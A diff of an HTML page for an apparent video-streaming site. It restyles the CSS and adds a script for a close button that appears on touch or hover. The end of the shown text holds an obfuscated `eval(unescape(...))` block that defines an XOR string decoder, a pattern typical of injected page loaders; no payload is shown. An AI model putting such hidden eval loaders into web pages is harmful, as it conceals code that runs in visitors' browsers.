@@ -31,138 +31,159 @@
   <!-- Favicon -->
   <link rel="icon" href="favicon.ico" type="image/x-icon">
     <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #121212; /* Dark background */
-            color: #ffffff; /* Light text color */
-        }
-        .container {
-            padding: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 10px;
-            padding: 20px;
-        }
-        .grid-item {
-            text-align: center;
-            background-color: #1e1e1e;
-            padding: 10px;
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        img {
-            width: 100%;
-            height: auto;
-            display: block;
-            border-radius: 8px;
-            transition: transform 0.3s ease-in-out;
-        }
-        .grid-item:hover img {
-            transform: scale(1.1);
-        }
-        .player {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            overflow: auto;
-        }
-        .player-content {
-            position: relative;
-            width: 80%;
-            max-width: 1200px; /* Maximum width for larger screens */
-            padding-top: 56.25%; /* 16:9 Aspect Ratio */
-            border-radius: 8px;
-            overflow: hidden;
-            background: #000;
-        }
-        .player iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        .player .close-btn {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: #fff;
-            border: none;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            z-index: 1001; /* Ensure it is above iframe */
-        }
-        .player .close-btn::before {
-            content: '✖';
-            font-size: 20px;
-            color: #000;
-        }
-        #season-episode-selection {
-            display: none;
-            position: fixed;
-            bottom: 20px; /* Distance from the bottom */
-            left: 50%;
-            transform: translateX(-50%);
-            width: calc(100% - 40px); /* Adjust to fit within player content */
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            background-color: rgba(0, 0, 0, 0.8);
-            padding: 10px;
-            box-sizing: border-box;
-            border-radius: 8px;
-            z-index: 1001; /* Ensure it is above iframe */
-        }
-        select {
-            margin: 0;
-            padding: 5px;
-            background-color: #333;
-            color: #fff;
-            border: 1px solid #555;
-            border-radius: 4px;
-        }
-        #filters {
-            display: flex;
-            justify-content: center;
-            gap: 10px; /* Adjust the gap between dropdowns as needed */
-            margin: 20px 0; /* Add some margin above and below */
-        }
-        #filters select {
-            padding: 5px;
-            background-color: #333;
-            color: #fff;
-            border: 1px solid #555;
-            border-radius: 4px;
-        }
-        #search-input {
-            padding: 10px;
-            width: 100%;
-            max-width: 400px;
-            margin: 20px auto;
-            display: block;
-            border: 1px solid #555;
-            border-radius: 4px;
-            background-color: #333;
-            color: #fff;
-        }
+    body {
+margin: 0;
+font-family: Arial, sans-serif;
+background-color: #121212; /* Dark background */
+color: #ffffff; /* Light text color */
+}
+
+.container {
+padding: 20px;
+max-width: 1200px;
+margin: 0 auto;
+}
+
+.grid {
+display: grid;
+grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+gap: 10px;
+padding: 20px;
+}
+
+.grid-item {
+text-align: center;
+background-color: #1e1e1e;
+padding: 10px;
+border-radius: 8px;
+overflow: hidden;
+}
+
+img {
+width: 100%;
+height: auto;
+display: block;
+border-radius: 8px;
+transition: transform 0.3s ease-in-out;
+}
+
+.grid-item:hover img {
+transform: scale(1.1);
+}
+
+.player {
+display: none;
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background-color: rgba(0, 0, 0, 0.8);
+justify-content: center;
+align-items: center;
+z-index: 1000;
+overflow: auto;
+}
+
+.player-content {
+position: relative;
+max-width: 70%;
+width: 100%;
+height: auto;
+border-radius: 8px;
+overflow: hidden;
+background: #000;
+}
+
+.player iframe {
+width: 100%;
+height: auto;
+aspect-ratio: 16/9;
+border: none;
+}
+
+.player .close-btn {
+position: absolute;
+top: 10px;
+right: 10px;
+background: #fff;
+border: none;
+border-radius: 50%;
+width: 30px;
+height: 30px;
+display: flex;
+justify-content: center;
+align-items: center;
+cursor: pointer;
+z-index: 1001; /* Ensure it is above iframe */
+opacity: 0; /* Initially hidden */
+transition: opacity 0.3s ease-in-out;
+}
+
+.player:hover .close-btn, /* Show when player is hovered */
+.player:focus-within .close-btn, /* Show when player is touched on mobile */
+.player .close-btn.show {
+opacity: 1; /* Show the button */
+}
+
+.player .close-btn::before {
+content: '✖';
+font-size: 20px;
+color: #000;
+}
+
+#season-episode-selection {
+display: none;
+position: fixed;
+bottom: 20px; /* Distance from the bottom */
+left: 50%;
+transform: translateX(-50%);
+width: calc(100% - 40px); /* Adjust to fit within player content */
+display: flex;
+justify-content: center;
+gap: 10px;
+padding: 10px;
+box-sizing: border-box;
+border-radius: 8px;
+z-index: 1001; /* Ensure it is above iframe */
+}
+
+select {
+margin: 0;
+padding: 5px;
+background-color: #333;
+color: #fff;
+border: 1px solid #555;
+border-radius: 4px;
+}
+
+#filters {
+display: flex;
+justify-content: center;
+gap: 10px; /* Adjust the gap between dropdowns as needed */
+margin: 20px 0; /* Add some margin above and below */
+}
+
+#filters select {
+padding: 5px;
+background-color: #333;
+color: #fff;
+border: 1px solid #555;
+border-radius: 4px;
+}
+
+#search-input {
+padding: 10px;
+width: 100%;
+max-width: 400px;
+margin: 20px auto;
+display: block;
+border: 1px solid #555;
+border-radius: 4px;
+background-color: #333;
+color: #fff;
+}
+
     </style>
 </head>
 <body>
@@ -646,6 +667,34 @@
 
                   initialize();
               </script>
+<script>
+              const closeButton = document.querySelector('.player .close-btn');
+const player = document.getElementById('tv-player');
+
+// Show the close button when the player is touched on mobile
+player.addEventListener('touchstart', () => {
+    closeButton.classList.add('show');
+});
+
+// Hide the close button when the player is not interacted with
+player.addEventListener('touchend', () => {
+    setTimeout(() => {
+        closeButton.classList.remove('show');
+    }, 2000); // Hide after 2 seconds
+});
+
+// Also hide the close button when not hovering on desktop
+player.addEventListener('mouseleave', () => {
+    closeButton.classList.remove('show');
+});
+
+// Show the player when clicked (your existing logic here)
+closeButton.addEventListener('click', () => {
+    player.style.display = 'none';
+    selectionDiv.style.display = 'none';
+    iframe.src = '';
+});
+</script>
               <script type="text/javascript">
               <!--
               eval(unescape('%66%75%6e%63%74%69%6f%6e%20%68%62%38%31%32%63%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%34%33%32%35%30%32%37%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%31%36%34%30%37%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%33%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
